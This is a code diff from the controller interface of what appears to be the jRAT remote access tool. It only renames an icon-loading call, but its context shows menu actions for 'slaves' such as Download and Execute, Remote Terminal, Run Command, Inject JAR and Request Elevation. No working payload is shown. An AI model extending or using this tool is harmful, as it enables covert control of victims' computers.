@@ -1,6 +1,6 @@
 package jrat.controller.ui.panels;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.common.downloadable.Downloadable;
 import jrat.controller.AbstractSlave;
 import jrat.controller.OfflineSlave;
@@ -75,21 +75,21 @@ public abstract class PanelMainClients extends JScrollPane {
 				}
 			}
 		});
-		mntmControlPanel.setIcon(IconUtils.getIcon("controlpanel"));
+		mntmControlPanel.setIcon(Resources.getIcon("controlpanel"));
 
 		popupMenu.add(mntmControlPanel);
 		popupMenu.addSeparator();
 
 		JMenu mnNetworking = new JMenu("Networking");
-		mnNetworking.setIcon(IconUtils.getIcon("process"));
+		mnNetworking.setIcon(Resources.getIcon("process"));
 		popupMenu.add(mnNetworking);
 
 		JMenuItem mntmexe = new JMenuItem("Download and Execute");
 		mnNetworking.add(mntmexe);
-		mntmexe.setIcon(IconUtils.getIcon("arrow-down"));
+		mntmexe.setIcon(Resources.getIcon("arrow-down"));
 
 		JMenuItem mntmUploadAndExecute = new JMenuItem("Upload and Execute");
-		mntmUploadAndExecute.setIcon(IconUtils.getIcon("drive-upload"));
+		mntmUploadAndExecute.setIcon(Resources.getIcon("drive-upload"));
 		mntmUploadAndExecute.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				List<AbstractSlave> servers = getSelectedSlaves();
@@ -123,10 +123,10 @@ public abstract class PanelMainClients extends JScrollPane {
 
 		JMenuItem mntmUpdateFromUrl = new JMenuItem("Update from URL");
 		mnNetworking.add(mntmUpdateFromUrl);
-		mntmUpdateFromUrl.setIcon(IconUtils.getIcon("update"));
+		mntmUpdateFromUrl.setIcon(Resources.getIcon("update"));
 
 		JMenuItem mntmUpdateFromFile = new JMenuItem("Update from File");
-		mntmUpdateFromFile.setIcon(IconUtils.getIcon("drive-upload"));
+		mntmUpdateFromFile.setIcon(Resources.getIcon("drive-upload"));
 		mntmUpdateFromFile.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				List<AbstractSlave> servers = getSelectedSlaves();
@@ -161,7 +161,7 @@ public abstract class PanelMainClients extends JScrollPane {
 
 		JMenuItem mntmHost = new JMenuItem("Host");
 		mnNetworking.add(mntmHost);
-		mntmHost.setIcon(IconUtils.getIcon("computer"));
+		mntmHost.setIcon(Resources.getIcon("computer"));
 		mntmHost.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				AbstractSlave slave = getSelectedSlave();
@@ -229,7 +229,7 @@ public abstract class PanelMainClients extends JScrollPane {
 		});
 
 		mnQuickOpen = new JMenu("Quick Open");
-		mnQuickOpen.setIcon(IconUtils.getIcon("application-import"));
+		mnQuickOpen.setIcon(Resources.getIcon("application-import"));
 		popupMenu.add(mnQuickOpen);
 
 		JMenuItem mntmVisitUrl = new JMenuItem("Visit URL");
@@ -264,7 +264,7 @@ public abstract class PanelMainClients extends JScrollPane {
 
 			}
 		});
-		mntmVisitUrl.setIcon(IconUtils.getIcon("application-browser"));
+		mntmVisitUrl.setIcon(Resources.getIcon("application-browser"));
 
 		JMenuItem mntmRemoteCmd = new JMenuItem("Remote Terminal");
 		mntmRemoteCmd.addActionListener(new ActionListener() {
@@ -276,7 +276,7 @@ public abstract class PanelMainClients extends JScrollPane {
 				}
 			}
 		});
-		mntmRemoteCmd.setIcon(IconUtils.getIcon("terminal"));
+		mntmRemoteCmd.setIcon(Resources.getIcon("terminal"));
 		mnQuickOpen.add(mntmRemoteCmd);
 
 		final JMenuItem mntmRemoteChat = new JMenuItem("Remote Chat");
@@ -290,11 +290,11 @@ public abstract class PanelMainClients extends JScrollPane {
 			}
 		});
 
-		mntmRemoteChat.setIcon(IconUtils.getIcon("chat"));
+		mntmRemoteChat.setIcon(Resources.getIcon("chat"));
 		mnQuickOpen.add(mntmRemoteChat);
 
 		JMenuItem mntmNotes = new JMenuItem("Notes");
-		mntmNotes.setIcon(IconUtils.getIcon("notes"));
+		mntmNotes.setIcon(Resources.getIcon("notes"));
 		mntmNotes.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				AbstractSlave slave = getSelectedSlave();
@@ -307,7 +307,7 @@ public abstract class PanelMainClients extends JScrollPane {
 		mnQuickOpen.add(mntmNotes);
 		
 		JMenu mnTools_1 = new JMenu("Tools");
-		mnTools_1.setIcon(IconUtils.getIcon("toolbox"));
+		mnTools_1.setIcon(Resources.getIcon("toolbox"));
 		popupMenu.add(mnTools_1);
 		
 				JMenuItem mntmRunCommand = new JMenuItem("Run Command");
@@ -329,11 +329,11 @@ public abstract class PanelMainClients extends JScrollPane {
 						}
 					}
 				});
-				mntmRunCommand.setIcon(IconUtils.getIcon("execute"));
+				mntmRunCommand.setIcon(Resources.getIcon("execute"));
 
 		JMenu mnInject = new JMenu("Inject JAR");
 		mnTools_1.add(mnInject);
-		mnInject.setIcon(IconUtils.getIcon("inject"));
+		mnInject.setIcon(Resources.getIcon("inject"));
 
 		JMenuItem mntmInjectFromUrl = new JMenuItem("Inject from URL");
 		mntmInjectFromUrl.addActionListener(new ActionListener() {
@@ -364,7 +364,7 @@ public abstract class PanelMainClients extends JScrollPane {
 				}
 			}
 		});
-		mntmInjectFromUrl.setIcon(IconUtils.getIcon("arrow-down"));
+		mntmInjectFromUrl.setIcon(Resources.getIcon("arrow-down"));
 		mnInject.add(mntmInjectFromUrl);
 
 		JMenuItem mntmInjectFromFile = new JMenuItem("Inject from file");
@@ -397,7 +397,7 @@ public abstract class PanelMainClients extends JScrollPane {
 				}
 			}
 		});
-		mntmInjectFromFile.setIcon(IconUtils.getIcon("drive-upload"));
+		mntmInjectFromFile.setIcon(Resources.getIcon("drive-upload"));
 		mnInject.add(mntmInjectFromFile);
 		
 		JMenuItem mntmRequestElevation = new JMenuItem("Request Elevation");
@@ -412,7 +412,7 @@ public abstract class PanelMainClients extends JScrollPane {
 				}
 			}
 		});
-		mntmRequestElevation.setIcon(IconUtils.getIcon("shield"));
+		mntmRequestElevation.setIcon(Resources.getIcon("shield"));
 		mnTools_1.add(mntmRequestElevation);
 		popupMenu.addSeparator();
 
@@ -426,7 +426,7 @@ public abstract class PanelMainClients extends JScrollPane {
 				}
 			}
 		});
-		mntmInfo.setIcon(IconUtils.getIcon("info"));
+		mntmInfo.setIcon(Resources.getIcon("info"));
 		popupMenu.add(mntmInfo);
 
 		JMenuItem mntmForceDisconnect = new JMenuItem("Disconnect");
@@ -479,10 +479,10 @@ public abstract class PanelMainClients extends JScrollPane {
 				}
 			}
 		});
-		mntmRename.setIcon(IconUtils.getIcon("rename"));
+		mntmRename.setIcon(Resources.getIcon("rename"));
 		popupMenu.add(mntmRename);
 		popupMenu.addSeparator();
-		mntmRestart.setIcon(IconUtils.getIcon("refresh"));
+		mntmRestart.setIcon(Resources.getIcon("refresh"));
 		popupMenu.add(mntmRestart);
 
 		JMenuItem mntmRestartConnection = new JMenuItem("Reconnect");
@@ -504,9 +504,9 @@ public abstract class PanelMainClients extends JScrollPane {
 				}
 			}
 		});
-		mntmRestartConnection.setIcon(IconUtils.getIcon("refresh-blue"));
+		mntmRestartConnection.setIcon(Resources.getIcon("refresh-blue"));
 		popupMenu.add(mntmRestartConnection);
-		mntmForceDisconnect.setIcon(IconUtils.getIcon("delete"));
+		mntmForceDisconnect.setIcon(Resources.getIcon("delete"));
 		popupMenu.add(mntmForceDisconnect);
 
 		JMenuItem mntmUninstall = new JMenuItem("Uninstall");
@@ -529,7 +529,7 @@ public abstract class PanelMainClients extends JScrollPane {
 			}
 		});
 
-		mntmUninstall.setIcon(IconUtils.getIcon("exit"));
+		mntmUninstall.setIcon(Resources.getIcon("exit"));
 		popupMenu.add(mntmUninstall);
 		
 		popupMenu.addPopupMenuListener(new PopupMenuListener() {
@@ -572,7 +572,7 @@ public abstract class PanelMainClients extends JScrollPane {
 							popupMenu.addSeparator();
 
 							JMenuItem mntmRemove = new JMenuItem("Remove");
-							mntmRemove.setIcon(IconUtils.getIcon("delete"));
+							mntmRemove.setIcon(Resources.getIcon("delete"));
 
 							mntmRemove.addActionListener(new ActionListener() {
 								@Override
